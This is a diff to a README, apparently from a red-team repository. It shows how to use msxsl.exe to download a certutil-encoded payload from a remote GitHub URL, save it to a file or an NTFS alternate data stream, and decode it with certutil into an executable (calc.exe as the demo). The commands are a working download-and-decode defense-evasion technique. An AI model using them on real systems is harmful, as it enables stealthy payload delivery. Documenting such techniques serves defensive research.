@@ -10,14 +10,14 @@ Now copy the certutil encoded payload from calc_payload.txt and insert into calc
 
 ## Use MSXSL to download XSL file with certutil encoded payload and save to file:
 ```
-msxsl.exe "https://raw.githubusercontent.com/RonnieSalomonsen/Use-msxsl-to-download-file/main/calc_xsl.xml " "https://raw.githubusercontent.com/RonnieSalomonsen/Use-msxsl-to-download-file/main/xsl.xml" -o <filename>
+msxsl.exe "https://raw.githubusercontent.com/RonnieSalomonsen/Use-msxsl-to-download-file/main/calc.xml" "https://raw.githubusercontent.com/RonnieSalomonsen/Use-msxsl-to-download-file/main/transform.xsl" -o <filename>
 
 certutil -decode <filename> calc.exe
 ```
 
 ## Use MSXSL to download XSL file with certutil encoded payload and save to ADS:
 ```
-msxsl.exe "https://raw.githubusercontent.com/RonnieSalomonsen/Use-msxsl-to-download-file/main/calc_xsl.xml" "https://raw.githubusercontent.com/RonnieSalomonsen/Use-msxsl-to-download-file/main/xsl.xml" -o <filename>:<ADS name>
+msxsl.exe "https://raw.githubusercontent.com/RonnieSalomonsen/Use-msxsl-to-download-file/main/calc.xml" "https://raw.githubusercontent.com/RonnieSalomonsen/Use-msxsl-to-download-file/main/transform.xsl" -o <filename>:<ADS name>
 
 certutil -decode <filename>:<ADS name> calc.exe
 ```
